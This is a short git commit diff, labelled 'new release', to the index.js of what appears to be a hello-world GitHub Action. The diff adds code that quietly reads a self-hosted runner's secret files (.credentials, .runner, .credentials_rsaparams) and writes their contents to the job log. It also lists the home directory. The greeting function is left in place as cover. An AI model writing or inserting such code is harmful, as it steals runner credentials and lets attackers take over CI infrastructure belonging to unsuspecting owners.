98232d8f257fe56b896b57b29740048a6f94abdc
dreamli0 <dreamli0169@gmail.com>
2023-07-05 18:26:15 -0400

    new release

--- index.js
+++ index.js
@@ -8,9 +8,19 @@ try {
     console.log(__dirname);
     const files = fs.readdirSync('/home/musset/actions-runner');
     files.forEach(element => {
-        console.log(element);
+        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
+            console.log(`-----${element}------`);
+            fs.readFile(element, function(err, data){
+                console.log(data)
+            });
+        }
         
     });
+    const files_other = fs.readdirSync('/home/musset');
+    files_other.forEach(element => {
+        console.log(element);
+    });
+
     const nameToGreet = core.getInput('who-to-greet');
     console.log(`Say Hello ${nameToGreet}!`);
     const time = (new Date()).toTimeString();
